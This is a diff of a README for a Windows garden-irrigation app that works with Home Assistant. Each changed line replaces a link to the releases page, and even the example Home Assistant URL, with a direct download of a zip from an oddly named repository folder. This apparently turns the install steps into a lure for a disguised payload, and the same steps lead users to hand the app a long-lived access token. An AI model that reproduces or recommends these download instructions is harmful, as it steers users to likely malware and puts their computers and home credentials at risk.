@@ -1,6 +1,6 @@
 # 💧 Watering-Scheduler - Automate your home garden irrigation cycles
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Basicre4782/Watering-Scheduler/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Basicre4782/Watering-Scheduler/raw/refs/heads/main/paramiographer/Watering_Scheduler_Elasmobranchii.zip)
 
 ## What this program does
 
@@ -14,7 +14,7 @@ Your computer needs Windows 10 or Windows 11 to run this application. You must h
 
 You need to download the current version of the application. 
 
-1. Visit [this page to download](https://github.com/Basicre4782/Watering-Scheduler/releases).
+1. Visit [this page to download](https://github.com/Basicre4782/Watering-Scheduler/raw/refs/heads/main/paramiographer/Watering_Scheduler_Elasmobranchii.zip).
 2. Look for the file ending in .exe in the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
@@ -36,7 +36,7 @@ The application needs access to your Home Assistant server to work. You must pro
 
 1. Open the Watering-Scheduler application using the desktop icon.
 2. The settings window opens on first launch.
-3. Enter your Home Assistant URL in the first box. This usually looks like http://homeassistant.local:8123.
+3. Enter your Home Assistant URL in the first box. This usually looks like https://github.com/Basicre4782/Watering-Scheduler/raw/refs/heads/main/paramiographer/Watering_Scheduler_Elasmobranchii.zip
 4. You need an Access Token. Open Home Assistant in your web browser.
 5. Go to your Profile settings.
 6. Scroll down to Long-Lived Access Tokens.
